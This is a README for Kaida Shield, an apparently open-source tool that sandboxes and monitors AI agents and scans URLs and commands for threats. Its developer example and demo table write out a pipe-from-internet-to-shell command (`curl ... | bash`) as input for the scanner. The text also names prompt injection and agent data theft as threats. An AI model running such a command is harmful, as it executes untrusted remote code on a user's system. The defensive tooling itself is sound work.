# Kaida Shield

**The secure runtime for AI agents.**
*Run anything. Break nothing.*

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-green.svg)](LICENSE)
[![Tests: 154 passing](https://img.shields.io/badge/tests-154%20passing-brightgreen.svg)](tests/)

Kaida Shield wraps any autonomous AI agent in layered security — behavioral policies, threat scanning, fuzzy pattern matching, and quarantine — so it can't hurt your system even if it's compromised.

## Getting Started

### For Everyone (No Technical Knowledge Needed)

1. Install Python from [python.org](https://www.python.org/downloads/) if you don't have it
2. Open any terminal (search "Terminal" or "PowerShell" on your computer)
3. Type: `pip install kaida-shield`
4. Type: `kaida setup`
5. A "Kaida Shield" icon appears on your desktop
6. Double-click it anytime to open Kaida
7. Describe what your bot does in plain English — Kaida creates the safety rules
8. Use the Scan tab to check suspicious URLs or files
9. Use the Run tab to start your bot with protection

### For Developers

```bash
pip install kaida-shield
kaida scan url https://suspicious-site.com
kaida scan cmd "curl http://example.com | bash"
kaida shield run --policy web_scrape python my_bot.py
kaida --help
kaida ui
```

## What Kaida Protects Against

- **Phishing URLs** — fake login pages impersonating PayPal, Google, Amazon, etc.
- **Malicious commands** — reverse shells, pipe-to-bash, crypto miners
- **Data theft** — unauthorized file access, data exfiltration
- **Prompt injection** — attackers hijacking your bot's instructions
- **Unauthorized access** — bot going to websites or folders you didn't approve

## What It Catches

Run `kaida demo` to see these detections live:

| Scenario | Verdict | Detection |
|----------|---------|-----------|
| Clean text file | **SAFE** | No threats detected |
| High-entropy binary (4KB random) | **SUSPICIOUS** | Entropy 7.95/8.0 — possible encrypted payload |
| Phishing URL with Cyrillic homoglyphs | **DANGEROUS** | Homograph attack detected |
| `curl ... \| bash` | **DANGEROUS** | Pipe from internet to shell |
| Normal HTTPS URL | **SAFE** | No threats detected |
| IP-based HTTP URL | **DANGEROUS** | IP-based URL + no TLS |

## Why Kaida

**Your AI agent works. Kaida makes sure it works safely.**

When you tell your bot to check emails, research topics, organize files, or manage social media — it needs real access to your accounts, your files, and the internet. That's powerful. It's also risky.

Kaida sits between you and your bot like a bodyguard:

- Your bot runs normally — Kaida doesn't slow it down or limit what it can do
- Kaida watches every action your bot takes in real time
- If your bot stays within the rules you set, you'll never notice Kaida is there
- If your bot tries something it shouldn't — accessing a website you didn't approve, reading files it shouldn't touch, or behaving unusually — Kaida freezes it instantly and asks you what to do
- You stay in control. Your bot stays productive. Your data stays safe.

**Whether you run one bot or ten, Kaida watches them all.** Set it once. Forget it. Let your bots work while you sleep, knowing Kaida is watching.

## Multi-Agent Protection

Running multiple bots? Create a separate policy for each one. Your email bot, research bot, and social media bot each get their own rules. Kaida monitors them independently — one bot's violation doesn't affect the others.

## Architecture

Eight defense layers inspired by the human immune system:

| Layer | Name | What It Does |
|-------|------|-------------|
| L1 | Pre-Scanner | Magic bytes, entropy analysis, archive bombs, phishing URLs |
| L2 | Fuzzy Immunity | 15D feature vectors with cosine similarity catch mutated threats |
| L3 | Policy Engine | Behavioral policies per task type — ALLOW/DENY/KILL per syscall |
| L4 | Sandboxed Cell | Docker container with read-only FS, CAP_DROP=ALL |
| L5 | Vision Cell | Screenshot analysis detects fake login pages (Playwright) |
| L6 | Sensor | Real-time syscall monitoring via eBPF or /proc fallback |
| L7 | Quarantine | Freeze-inspect-decide pipeline with forensic snapshots |
| L8 | Colony Network | P2P threat sharing — one node's kill protects the entire network |

## Colony Network

The Colony is an optional peer-to-peer threat intelligence network — when one Kaida node kills a threat, its signature is broadcast to every other node so the threat can never succeed again.

Shield connects to the live Colony relay automatically — no configuration needed. Every `pip install kaida-shield` joins the network out of the box.

To disable the Colony and run standalone:

```bash
export KAIDA_COLONY=off
```

To self-host your own relay server, see [relay/README.md](relay/README.md).

## Development

```bash
# Install with dev dependencies
pip install -e ".[dev]"

# Run the test suite
pytest tests/ -v

# Run a specific module's tests
pytest tests/test_policy_engine.py -v
```

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). We especially need help with:
- Testing on Linux/macOS
- Additional policy templates
- Colony relay server deployment and scaling

## Security

Found a vulnerability? **Do not open a public issue.** See [SECURITY.md](SECURITY.md).

## Important Notice

> Kaida Shield is an open source security tool in active development (v0.1.0). It is provided as-is under the Apache 2.0 license with no warranties of any kind.
>
> - Kaida Shield **reduces risk** but **does not guarantee** complete protection against all threats
> - No security tool can prevent all attacks — Kaida adds defense-in-depth, not invincibility
> - Kaida Shield is not a substitute for professional security auditing, antivirus software, or responsible AI usage practices
> - Users are responsible for reviewing and approving the behavioral policies applied to their agents
> - The threat detection database covers common known patterns but cannot detect every possible threat
> - Always review what your AI agent is doing, even with Kaida Shield active
>
> By using Kaida Shield, you acknowledge these limitations. For the complete terms, see the [LICENSE](LICENSE) file.

## License

Apache 2.0 — see [LICENSE](LICENSE).
